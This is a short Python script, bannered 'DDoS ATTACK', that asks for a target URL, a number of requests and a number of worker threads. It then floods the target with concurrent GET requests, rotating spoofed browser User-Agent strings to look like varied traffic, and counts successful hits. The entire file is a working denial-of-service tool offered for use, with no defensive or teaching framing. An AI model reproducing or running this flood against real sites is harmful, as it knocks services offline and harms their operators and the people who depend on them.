import requests
import random
import os
import time
from concurrent.futures import ThreadPoolExecutor
import threading

success_counter = 0
counter_lock = threading.Lock()

def show():
    os.system('clear')
    print("\033[1m\033[91m                 𝔻𝔻𝕠𝕊 𝔸𝕋𝕋𝔸ℂ𝕂\033[0m")
    print("\n\n")

                                                                                 

def send_request(url):
    global success_counter
    
    try:
        user_agents = [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
            "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
            "SamsungBrowser/17.0 (Galaxy S23 Ultra; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        ]
        
        # Choose a random User-Agent from the list
        user_agent = random.choice(user_agents)
        
        # Set the User-Agent header
        headers = {"User-Agent": user_agent}
        
        # Send GET request with the specified User-Agent
        response = requests.get(url, headers=headers)
        
        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            with counter_lock:
                success_counter += 1
            print(f"\033[1;35m{success_counter} => Request to \033[1;37m{url} \033[1;34m with \033[1;33mUser-Agent \033[1;37m{user_agent} \033[0;32msuccessful\033[0m")
            # Process response data if needed
        else:
            print(f"Request to \033[0;31m{url} with User-Agent {user_agent} \033[0;31mfailed with status code: {response.status_code}\033[0m")
            
    except requests.exceptions.RequestException as e:
        print(f"\033[0mAn error occurred while sending request to \033[0;31m{url}\033[0m: {e}")

def main():
    show()
    try:
        # Define the URL
        url = input("\033[96mEnter target URL: ")
        
        # Number of times to send the request
        num_requests = int(input("\033[97mEnter number of requests: "))
        
        # Maximum number of workers
        max_workers = int(input("\033[94mEnter number of workers: "))
        
        # Create a ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit requests
            for _ in range(num_requests):
                executor.submit(send_request, url)
        
        # Print the total number of successful requests
        print(f"\033[0;33mTotal successful requests: {success_counter}\033[0m")
    
    except ValueError:
        print("Invalid input. Please enter a valid integer for number of requests and workers.")

if __name__ == "__main__":
    main()
